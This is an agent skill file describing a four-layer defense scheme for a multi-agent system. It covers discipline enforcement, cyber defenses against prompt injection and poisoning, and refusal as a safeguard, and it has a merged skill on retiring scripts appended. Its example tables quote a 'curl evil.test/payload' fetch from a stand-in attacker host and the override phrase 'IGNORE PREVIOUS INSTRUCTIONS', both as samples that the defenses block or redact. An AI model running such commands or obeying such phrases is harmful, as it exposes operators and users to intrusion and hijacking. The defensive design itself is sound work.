---
name: four-shields
description: |
  🛡🧠⛓🪞 + 🏰🧹🩺🪞 — the complete defense posture. Discipline (the
  original four-shields) + cyber defense (the absorbed four-bulkheads
  sister doctrine) sharing the same four-layer geometry. Each layer is
  cheaper than the next; skip one = drift propagates at that layer's
  speed. Merged 2026-05-23: kept the four-shields name as canonical;
  four-bulkheads content folded in as §B (cyber half) while §A retains
  the original discipline half.
type: knowledge
triggers:
  # ── shields language (discipline enforcement) ──
  - four shields
  - four-shields
  - 4-layer
  - 4 layer
  - enforcement
  - enforcement stack
  - discipline stack
  - structural cognitive reactive recovery
  - prevent block catch
  - belt and suspenders
  - shield stack
  # ── bulkheads language (cyber defense) ──
  - four bulkheads
  - four-bulkheads
  - bulkhead
  - defense in depth
  - defense-in-depth
  - security
  - secure
  - cyber
  - cybersec
  - cybersecurity
  - prompt injection
  - data poisoning
  - sanitize input
  - sanitize output
  - sanitization
  - quarantine
  - egress filter
  - allowlist
  - web fetch safety
  - SSRF
  - injection attack
  # ── shared ──
  - four layer enforcement
  - four-layer-enforcement
  - immune system
  - f(0) discipline
  - belt suspenders airbag
---

<!-- Glossary alignment 2026-06-02 (canonical: citations/glossary/02-CANONICAL-GLOSSARY.md):
     Authority: the unified Reckon glossary SUPERSEDES the legacy swarmy-ui UI-layer glossary.
     LOCKED term-set (tiers: flotilla > fleet > voyage > charter > mission > crew):
     - capped        -> sealed (eligible+ready for promotion) / promoted (landed in canonical forensics/)
     - queued        -> on-deck (an AGENT's claim on the spawn roster) / next/ (where queued CHARTERS live)
     - spawn-queue   -> spawn-roster (the on-deck agent dir _spawn-roster/)
     - agent-bundle  -> waypoint (tactical handoff to chart/next/)
     - charter-draft -> flight-plan (new-voyage proposal, operator-cleared)
     - sound         -> survey (the deep/wide rhythm: probe 🔬 / sweep 🌊 / both 🌀)
     - swarm         -> fleet (user footprint) ; swarm agents -> crew (agents on one mission)
     Completion ritual: 2 columns — lifecycle_judgment (col A) + free_choice (col B), 19 kinds.
     RENAME RULE: migrate LIVE surfaces cleanly; NEVER rename archives / forensic record.
     Preserved: completion_choice.kind enum members in JSON code blocks,
                faerie2-origin: comments, historical-event quotes.
-->

# 🛡🧠⛓🪞 + 🏰🧹🩺🪞 — four-layer enforcement (shields + bulkheads)

> **Merged 2026-05-23.** Was: `four-shields/SKILL.md` (114 lines, discipline
> enforcement) + `four-bulkheads/SKILL.md` (346 lines, cyber defense).
> Originals at `.agents/skills/_archive-2026-05-23-consolidation/`. They
> were always sister doctrines — same four-layer geometry, different
> threat models.

Two threat models, ONE geometry: every defense in swarmy fires at four
layers, each cheaper than the next. Skip a layer = the threat propagates
at that layer's speed.

```
LAYER          🛡 SHIELDS (discipline)              🏰 BULKHEADS (cyber)
─────          ────────────────────────             ────────────────────────
1 prevent      🛡 structural    schema / type       🏰 perimeter    egress allowlist
2 remind       🧠 cognitive     skill / micro-agent 🧹 purification sanitizer
3 block        ⛓ reactive      hook rejection      🩺 detection    poisoning scan
4 catch        🪞 recovery      audit + reputation  🪞 quarantine   evidence locker
```

The recovery / quarantine icon 🪞 is shared on purpose: at the slowest
layer, BOTH stacks reflect on what got through and route it for review.

---

## §A — Shields (discipline enforcement)

Every swarmy discipline (charter, mode, manifest, spawn) fires at four
shields:

```
🛡 STRUCTURAL  — prevent: the wrong thing CAN'T be expressed
🧠 COGNITIVE   — remind:  skill/microagent fires before action
⛓ REACTIVE    — block:   hook rejects at the OS boundary
🪞 RECOVERY    — catch:   periodic audit + reputation scoring
```

### When each shield fires

| Shield | Speed | Who runs it | Example |
|---|---|---|---|
| 🛡 Structural | Compile / parse time | Schema validators (`forensics/schemas/`), writer schemas (`scripts/1a_manifest_writer.py`), JSON-RPC arg parsing | A manifest missing `mission` field fails before it's written |
| 🧠 Cognitive | Pre-action (agent reads skill) | `.agents/skills/*/SKILL.md` triggers; persona system prompt | Agent about to spawn reads `spawn/SKILL.md`; sees PRE-REG-GATE rule |
| ⛓ Reactive | At-action (PostToolUse) | `.openhands/hooks/*` hook scripts | `9x_hook-manifest-sign-enforce.py` rejects unsigned manifest |
| 🪞 Recovery | Post-action (scheduled audit) | `scripts/shapes/audit-shapes.py`, `forensic-sentinel.sh`, periodic linters | Nightly audit flags a shape regression; admin-review queue surfaces it |

### The cheaper-earlier law

Cheaper = closer to the source of the action. Catch drift at the
shield closest to its origin and the cost is lowest. Structural
prevention costs nothing per request (it's a schema check). Recovery
costs the audit cron's full sweep. Skip structural and you pay the
audit-sweep cost forever for that class of mistake.

### Patterns that respect all four shields

- **Charter pre-reg gate** — structural (schema requires charter); cognitive (`spawn/SKILL.md` reminds); reactive (`spawn_hook` blocks); recovery (audit detects unregistered changes)
- **Manifest signing** — structural (schema requires `signer`+`signed_by`); cognitive (`manifest-discipline/SKILL.md`); reactive (`9x_hook-manifest-sign-enforce.py`); recovery (`lint-manifest-signing.sh`)
- **Mode enforcement** — structural (mode field on every manifest); cognitive (each mode's skill); reactive (mode-specific hooks); recovery (mode-drift detector)

---

## §B — Bulkheads (cyber defense)

While shields enforce DISCIPLINE (preventing operator mistakes + agent
sloppiness), bulkheads defend against ADVERSARIAL inputs from the
internet — prompt injection, data poisoning, exfiltration attempts,
chain-of-custody attacks.

```
🏰 PERIMETER    — prevent: egress allowlist blocks unsanctioned URLs
🧹 PURIFICATION — clean:   sanitize_lib strips injection patterns
🩺 DETECTION    — scan:    poisoning-detector flags COC anomalies
🪞 QUARANTINE   — isolate: route flagged content to evidence locker
```

### When each bulkhead fires

| Bulkhead | Layer | Where | Example |
|---|---|---|---|
| 🏰 Perimeter | Outbound HTTP | `forensics/security/egress-allowlist.txt` + `mcp_security_middleware.enforce_egress()` + `0x_hook-egress-allowlist.py` | Agent tries `curl evil.test/payload` → BLOCKED before request leaves the box |
| 🧹 Purification | Inbound text | `scripts/sanitizer/sanitize_lib.py` via `mcp_security_middleware.sanitize_call_args()` + `.openhands/hooks/2x_hook-sanitizer.py` | `IGNORE PREVIOUS INSTRUCTIONS...` → REDACTED to `[REDACTED:incoming.prompt_injection]...` |
| 🩺 Detection | Stored content | `.openhands/hooks/3x_hook-poisoning-detector.py` + nightly audit | Manifest in `forensics/ephemeral/` has invisible unicode tag-injection → flag |
| 🪞 Quarantine | Confirmed threats | `scripts/quarantine/quarantine_lib.py` + `mcp_security_middleware._maybe_quarantine()` | High/critical-severity finding → auto-routed to `forensics/quarantine/incoming/{date}/{topic}-{severity}-{sha}/` |

### Two layers of perimeter

The egress allowlist runs at TWO points:

1. **OH-hook layer** (`.openhands/hooks/0x_hook-egress-allowlist.py`) — catches WebFetch/subprocess egress from OH-spawned agents
2. **MCP server layer** (`deploy/mcp-server/mcp_security_middleware.SecureClient`) — catches outbound HTTP from inside the server process itself (for direct MCP-RPC callers, e.g. LibreChat, curl, external clients)

The MCP-layer wrapping closed the original gap where direct JSON-RPC bypassed the hook stack.

### Two-direction purification

Sanitization runs BOTH directions:

- **Incoming** (`sanitize_call_args`) — adversarial content in tool arguments (URLs, free-text)
- **Outgoing** (`sanitize_call_result`) — re-injection-on-read defense; a poisoned stored manifest can't fire on the next caller

### Auto-quarantine

Critical/high-severity flags auto-route the offending blob into
`forensics/quarantine/incoming/{date}/{topic}-{severity}-{sha8}/`. The
directory name is human-readable (e.g. `2026-05-23T03-01-41Z__suspected-prompt-injection-attempt__high__e5084f99/`).
See `docs/QUARANTINE-TRIAGE-PROCEDURE.md` for the 6-step operator SOP
that handles the items once they land in quarantine.

### Audit feed

Every middleware decision lands in
`forensics/eval/mcp-sanitization-{date}.jsonl` (signed via eval_writer);
high/critical events ALSO copy to
`forensics/eval/admin-review-{date}.jsonl` with a `why_semantic` field
the operator can read by eye. Aggregates at
`forensics/eval/admin-review-aggregate.json`. The forensic-sentinel
sidecar (checks 5, 7, 8) watches these for bursts.

---

## §C — Sharing the recovery layer (🪞)

The shared icon is not cosmetic. At the slowest layer:

- **Shields' recovery** runs the nightly audit + reputation scoring; surfaces drift to the operator dashboard
- **Bulkheads' quarantine** runs the evidence-locker triage; surfaces suspected attacks to the operator dashboard

Same dashboard, same operator, same review-resolved log structure
(`admin-review-resolved-{date}.jsonl`). The two stacks converge at the
human-in-the-loop point because that's where they SHOULD converge —
discipline drift and adversarial input are both signals that "something
escaped the earlier layers; please look."

---

## §D — Reading order for incident response

When something bad happens:

1. **Which stack?** Discipline drift (an agent did something it shouldn't have, but no adversary) → shields. External attack / weird content / poisoned record → bulkheads.
2. **Which layer caught it?** Look at the flag's source.
   - Schema validator → 🛡 structural (highest signal: it never got written)
   - Hook reject → ⛓ reactive (it tried, was stopped at OS boundary)
   - Audit / quarantine → 🪞 recovery (it slipped through; recovery did its job; investigate why earlier layers missed)
3. **Why did earlier layers miss?** This is the post-mortem. If recovery is consistently catching what reactive should have, the reactive layer has a hole.
4. **Promote the fix to the earliest possible layer.** Catching at structural costs ~nothing; catching at recovery costs the full audit-sweep budget every time.

---

## §E — Refusal as a discipline shield

> **Added 2026-05-25 (SYNTH propagation).** Refusal is a defense-in-depth mechanism, not
> an exception path. It protects the system from being weaponized against its operators
> or third parties.

**Refusal is the seventh shield.** The four formal layers (structural / cognitive / reactive /
recovery) prevent agent mistakes and adversarial inputs. Substantive refusal addresses a third
threat class: **intentional misuse by the operator or a malicious brief injected into the
workflow** — neither mistake nor external attack, but a directed misuse of the agent's capabilities.

The four layers cannot fully address this threat class because they fire on FORMAT (wrong schema,
bad URL, poisoned manifest). Refusal fires on CONTENT (harmful purpose, moral objection,
strategic incompatibility) — a semantic layer the four shields do not cover.

### Where refusal fires in the four-layer geometry

| Layer equivalent | What | How refusal fits |
|---|---|---|
| 🛡 Structural | Schema + type enforcement | Charter pre-reg gate can encode refuse-on-sight for known-harmful task categories (rubric-derived `lifecycle_judgment=refuse`) |
| 🧠 Cognitive | Skill reminder before action | Seven-lens framework in `completion-choice/CANONICAL-SET.md` fires when agent reads a brief — cognitive-layer analysis |
| ⛓ Reactive | Hook rejection at OS boundary | (Refusal is agent-side, not hook-side; but a hook CAN block execution of manifests with known-harmful `task_id` patterns) |
| 🪞 Recovery | Audit + reputation | Refused-edges in `mission-graph.json` are auditable; reputation system rewards substantive refusal; patterns surface for operator review |

### What "weaponized against operators" means

An agent that executes every brief without ethical analysis can be used to:
- Fabricate the operator's own forensic record (framing the operator in their own system)
- Build infrastructure that harms the operator's users
- Produce artifacts that expose the operator to legal liability

Substantive refusal prevents these outcomes. An agent that refuses a brief to fabricate audit
logs is protecting the operator even when the brief appeared to come from them —
because the harm would have fallen on the operator and their users.

### Refusal reputation invariant

The reputation system MUST NOT ding substantive refusal. A negative reputation signal on
`lifecycle_judgment=refuse` would create perverse incentive: agents would execute harmful
work to protect their reputation score. This is the canonical failure mode for compliance
systems without a refusal-protection clause.

The reputation system dings:
- `decline` used inappropriately (capability is present; agent is avoiding work)
- `refuse` used for routine work without ethical justification (avoidance pattern)

The reputation system rewards:
- `refuse` with a substantive seven-lens rationale (≥400 char sensitivity-tier reasoning)
- `refuse` followed by `free_choice=spawn_seed` with an alternative formulation

## See also

- `.agents/skills/four-bulkheads/...` archived to `.agents/skills/_archive-2026-05-23-consolidation/four-bulkheads/` (346 lines original — full per-bulkhead operational detail)
- `.agents/skills/four-shields/...` archived to `.agents/skills/_archive-2026-05-23-consolidation/four-shields/` (114 lines original)
- `docs/35-FOUR-LAYER-ENFORCEMENT-CANONICAL.md` — long-form canonical doc
- `docs/QUARANTINE-TRIAGE-PROCEDURE.md` — quarantine SOP
- `.agents/skills/codeguard/SKILL.md` — security-aware code generation rules
- `.agents/skills/auth-tier/SKILL.md` — tier model (paired with bulkhead's perimeter)
- `deploy/mcp-server/mcp_security_middleware.py` — bulkheads 1, 2, 4 implementation
- `.openhands/hooks/0x_hook-egress-allowlist.py` — bulkhead 1 (OH layer)
- `.openhands/hooks/2x_hook-sanitizer.py` — bulkhead 2 (OH layer)
- `.openhands/hooks/3x_hook-poisoning-detector.py` — bulkhead 3
- `scripts/quarantine/quarantine_lib.py` — bulkhead 4
- `scripts/sanitizer/sanitize_lib.py` — purification engine
- `forensics/security/egress-allowlist.txt` — perimeter configuration


<!-- crystallize:braid-begin -->
# CRYSTALLIZED 2026-06-03

> 1 doc(s) braided in; sources archived to `_archive-2026-06-03/`. Net-new + conflicts preserved below.

<!-- braid: preamble from SKILL.md -->
---
name: script-quarantine
description: |
  Rules for retiring scripts. NEVER delete a script. Quarantine with
  provenance — every retired file goes to `scripts/quarantine/canonical/`
  with a ledger entry naming what its "good pieces" became in the canonical
  fleet. Use when crystallizing duplicate or overlapping scripts.
type: knowledge
triggers:
  - retire script
  - archive script
  - quarantine script
  - quarantine ledger
  - deprecate script
  - retire to quarantine
  - script crystallization
---

<!-- Glossary alignment 2026-06-02 (canonical: citations/glossary/02-CANONICAL-GLOSSARY.md):
     Authority: the unified Reckon glossary SUPERSEDES the legacy swarmy-ui UI-layer glossary.
     LOCKED term-set (tiers: flotilla > fleet > voyage > charter > mission > crew):
     - capped        -> sealed (eligible+ready for promotion) / promoted (landed in canonical forensics/)
     - queued        -> on-deck (an AGENT's claim on the spawn roster) / next/ (where queued CHARTERS live)
     - spawn-queue   -> spawn-roster (the on-deck agent dir _spawn-roster/)
     - agent-bundle  -> waypoint (tactical handoff to chart/next/)
     - charter-draft -> flight-plan (new-voyage proposal, operator-cleared)
     - sound         -> survey (the deep/wide rhythm: probe 🔬 / sweep 🌊 / both 🌀)
     - swarm         -> fleet (user footprint) ; swarm agents -> crew (agents on one mission)
     Completion ritual: 2 columns — lifecycle_judgment (col A) + free_choice (col B), 19 kinds.
     RENAME RULE: migrate LIVE surfaces cleanly; NEVER rename archives / forensic record.
     Preserved: completion_choice.kind enum members in JSON code blocks,
                faerie2-origin: comments, historical-event quotes.
-->


<!-- braid: h:script-quarantine-retire-scripts-with-provenance from SKILL.md -->
# script-quarantine — Retire Scripts with Provenance


<!-- braid: h:the-mandate from SKILL.md -->
## The mandate

User direction, verbatim: **"never delete a script — they all contain good
pieces."** This skill encodes the discipline.


<!-- braid: h:the-three-actions from SKILL.md -->
## The three actions

When you find a script that overlaps with a canonical one, decide:

- **KEEP** — promote to canonical; no quarantine entry needed.
- **MERGE** — fold its good logic into the canonical; THEN retire the
  original (you cannot retire until the good pieces have landed somewhere
  recoverable).
- **RETIRE** — move to `scripts/quarantine/canonical/{category}/{YYYY-MM-DD}-retired/`
  with a `QUARANTINE-LEDGER.md` entry.


<!-- braid: h:the-retire-procedure from SKILL.md -->
## The retire procedure

1. **Identify the canonical sibling.** The script you're retiring must have
   a successor that absorbs its good pieces. If no successor exists, the
   retire is premature — keep the file in place.
2. **`git mv`, never `rm`.** Preserves blame + history.
3. **Path convention:**
   ```
   scripts/quarantine/canonical/{category}/{YYYY-MM-DD}-retired/{original_name}
   ```
   Categories so far: `bundle/`, `coc/`, `eval/`, `manifest/`, `routing/`,
   `spawn/`. Add a new category folder if none fits.
4. **Add a ledger row.** Edit `scripts/quarantine/canonical/QUARANTINE-LEDGER.md`:
   ```
   | 2026-MM-DD | scripts/foo.py | scripts/quarantine/canonical/{cat}/{date}-retired/foo.py | <why> | <good_pieces_landed_in> |
   ```
5. **Update the manifest's `_evolution_log[]`** to record this retire as a
   cut.


<!-- braid: h:what-good-pieces-landed-in-means from SKILL.md -->
## What "good pieces landed in" means

Every retire row must answer: **if someone wanted that script's logic
tomorrow, where would they find it?** Acceptable answers:

- A specific function or class in a named canonical script
- A consolidated rewrite (with a pointer to the consolidated file)
- "Documentation-only — no runtime logic retired" (only if literally true)

Unacceptable:

- "It was duplicated, just gone now" — duplication isn't always lossless;
  point at the canonical
- (blank) — no row at all


<!-- braid: h:what-not-to-retire from SKILL.md -->
## What NOT to retire

- **Anything currently called by `deploy/mcp-server/`** — wrappers depend on
  paths; retire orphans only
- **Anything called by `.openhands/hooks/`** — hooks fire on session events;
  breaking them silently is a tax on future operators
- **Anything in the 16 frontend-critical MCP tool chain** — see
  `deploy/mcp-server/tools/REGISTRY.json::frontend_critical`


<!-- braid: h:audit-before-retire from SKILL.md -->
## Audit before retire

```bash
# Find all callers of the candidate before retiring:
grep -rln "name_of_candidate" --include="*.py" --include="*.sh" \
  --include="*.md" --include="*.json" | grep -v "_archive\|quarantine"
```

If callers exist outside `_archive` / `quarantine`, fix them first or
abort the retire.


<!-- braid: h:dead-call-missing-script-audit-run-this-regularly from SKILL.md -->
## Dead-call & missing-script audit (run this regularly)

Retiring is the forward direction. The reverse problem is just as common:
a caller references a script that **doesn't exist** — name drift after a
rename, a half-finished feature, or a successor that landed under a new
name. The lifecycle discipline is: **find these regularly, and for each one
DECIDE — don't just move on.**

> Doctrine: *not everything missing should be forgotten. Consider it in the
> context of what we already have.* A missing reference is sometimes a stale
> caller to delete, and sometimes a load-bearing gap that SHOULD be filled.

Run the auditor (lives with this skill):

```bash
python3 .agents/skills/script-quarantine/scripts/audit_dead_calls.py
python3 .agents/skills/script-quarantine/scripts/audit_dead_calls.py --json   # CI/hook
```

It scans live code (excludes `forensics/`, archives, quarantine, `_recovery`,
disabled/backup files), finds references to missing scripts, fuzzy-matches
each against the existing fleet, and emits a DECISION per finding:

| Decision | Meaning | Action |
|---|---|---|
| 🔴 **FILL** | A successor likely exists (name drift) OR an UNGUARDED live call depends on it | Repoint the caller, or implement the script. Load-bearing. |
| 🟡 **RETIRE-REF** | Only doc/comment mentions; no live invocation | Fix or delete the dangling reference. |
| 🔵 **INVESTIGATE** | Call is guarded with `.exists()` (degrades) or ambiguous | Confirm the optionality is intentional (e.g. a baseline opt-out). |

Exit code is non-zero when any FILL-class finding exists, so it gates a
lifecycle hook / CI step. Wire it into the survey rhythm (see
`survey/SKILL.md`) so every crystallization wave starts with a clean audit.

**The required-vs-optional distinction matters.** A guarded call that falls
back to cache is fine to leave (INVESTIGATE). An *unguarded required* call —
e.g. the eval harness, which must run unless an explicit baseline opt-out is
set — is a FILL: a missing harness should surface as an error, never be
silently swallowed.


<!-- braid: h:worked-example-2026-05-22-canon-crystallization-01 from SKILL.md -->
## Worked example (2026-05-22 canon-crystallization-01)

Three retires this wave:

| Original | Successor | Why |
|---|---|---|
| `scripts/3x_eval-baseline` | `scripts/3b_eval_baseline_runner.py` | v1 binary → v2 schema runner |
| `scripts/3x_eval-faerie2` | `scripts/3d_eval_faerie2_runner.py` | v1 binary → v2 schema runner |
| `scripts/3x_vault-reconciliation` | `scripts/4k_vault_status.py` + `breadcrumbs_vault_sync.py` | shell-style binary → canonical Python tools |

Each row written to `QUARANTINE-LEDGER.md` with a one-line "why" and
"good_pieces_landed_in" pointer.


<!-- braid: h:worked-example-2026-06-02-eval-surface-consolidation from SKILL.md -->
## Worked example (2026-06-02 eval-surface consolidation)

Audit keywords **eval · emergence · metrics · membench · probes** surfaced
~12 separately-invoked eval scripts + a dead `eval_harness.py` reference.
Decisions, in context of the sequence they belong to:

- **`eval_harness.py`** (referenced by `eval_usage.py`, `verify-defense-stack.sh`)
  → 🔴 FILL via repoint: the name never existed; the real harness is
  `scripts/run_eval.py`. Callers repointed. The unguarded `metrics_read`
  refresh path now hard-errors if the harness is absent (required-by-default),
  with a `skip_harness` opt-out for vanilla baselines.
- **`metrics_vibe_test.py`** (tool called this name; file was `swarmy_vibe_test.py`)
  → 🔴 FILL via rename: `git mv` to the name the tool actually invokes.
- The eval surface collapsed to **3 canonical entry points** by sequence
  position — `run_eval.py` (orchestrate), `3f_membench_probes.py` (membench),
  `3a_emergence_metrics.py` (emergence). `3b/3c/3d/3i/3j/3k` reclassified as
  INTERNAL STAGES of the orchestrator, not entry points. Documented in
  `eval-dashboard/SKILL.md §A`. No deletes — the stages keep their good
  pieces; only the *surface* narrowed.


<!-- BRAID-CONFLICT: h:see-also from SKILL.md differs from canonical — human review needed -->
## See also

- `scripts/quarantine/canonical/QUARANTINE-LEDGER.md` — the immutable ledger
- `.agents/skills/canon-crystallization/SKILL.md` — meta-skill (when to crystallize a fleet)
- `.agents/skills/survey/SKILL.md` — the sound wave discipline that produces retires

<!-- crystallize:braid-end -->
